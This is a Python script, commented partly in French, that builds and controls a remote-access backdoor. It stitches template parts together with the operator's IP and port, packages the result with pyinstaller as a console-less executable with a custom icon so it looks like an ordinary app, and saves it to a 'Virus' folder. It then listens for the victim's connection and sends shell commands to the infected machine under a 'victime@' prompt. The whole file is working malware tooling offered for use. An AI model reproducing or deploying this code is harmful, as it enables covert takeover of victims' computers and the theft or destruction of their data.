import sys
import socket
from colorama import init, Fore
import os
import shutil

init()

os.system("clear")

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

#fichier1 = open("partie1.txt", "r")
#fichier2 = open("partie2.txt", "r")
#fichier = open("virus.py", "w")
#fichier.write(f"{fichier1} '{ip_address}'\n{fichier2}")
#fichier.close()
#fichier1.close()
#fichier2.close()
dmd = input("Would you like to reopen a remote connection? (y/n)>>")
portpls = input(f"{Fore.BLUE}choose a port for the backdor please>>")#
if(dmd == "n"):
    fichier1 = open("partie1.txt", "r").read()
    fichier2 = open("partie2.txt", "r").read()
    fichiermiddle = open("partiemiddle.txt", "r").read()
    name = input(f"{Fore.BLUE}please enter name for this app {Fore.RED}(Please do not integrate extension){Fore.BLUE}>>")
    with open(f"{name}.py", "w") as fichier:
        fichier.write(f"{fichier1} '{ip_address}'\n{fichiermiddle} {portpls}\n\n{fichier2}")

    os.system("clear")
    command = "pyinstaller --noconsole --onefile --icon="
    user = input(f"{Fore.BLUE}path of file icon (.jpeg, .png, .jpg) {Fore.RED}(please no integrate space in path){Fore.BLUE}>>")
    print(f"{Fore.BLUE}[+]creating app...\n\n")
    os.system(f"{command}{user} '{name}'.py")
    os.system("rm -r build")
    os.system(f"rm -r {name}.spec")
    os.system(f"rm -r {name}.py")
    os.rename("dist", "Virus")
    os.system("clear")

SERVER_IP = ip_address
PORT = int(portpls)

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_IP, PORT))

s.listen(1)



while True:
    #print(Fore.RED, f"Please search in the folder Virus the application \"{name}\"")
    print(Fore.BLUE, "your ip address is: ", ip_address)
    print(f'\n{Fore.GREEN}[+] listening as {SERVER_IP,}:{PORT}\n')


    client = s.accept()

    print(f'{Fore.GREEN}[+] client connected {SERVER_IP}:{PORT}\n')
    ip = client[0].recv(1024).decode('utf-8')
    print(Fore.RED, ip)
    #client[0].send('connected'.encode())

    while True:
        cmd = input(f'{Fore.GREEN}victime@{SERVER_IP}:{PORT}>')#\033[0;31mhello world en rouge\033[0;31m
        if(cmd == ""):
            print(f"{Fore.RED}Rien n'a été entré!")
            cmd = input(f'{Fore.GREEN}victime@{SERVER_IP}:{PORT}>')
            client[0].send(cmd.encode())
        else:
            if(cmd == "clear"):
                os.system("clear")
                cmd = input(f'{Fore.GREEN}victime@{SERVER_IP}:{PORT}>')
                client[0].send(cmd.encode())
            else:
                client[0].send(cmd.encode())
        #affin de dire si entré et appuyé passer parse que rien n'est écrit ne rien envoyer et réafficher l'endroit pour la commande
        if cmd.lower() in ['quit', 'exit', 'q', 'x']:
            break
        
        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input("wait for new client y/n?: ") or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
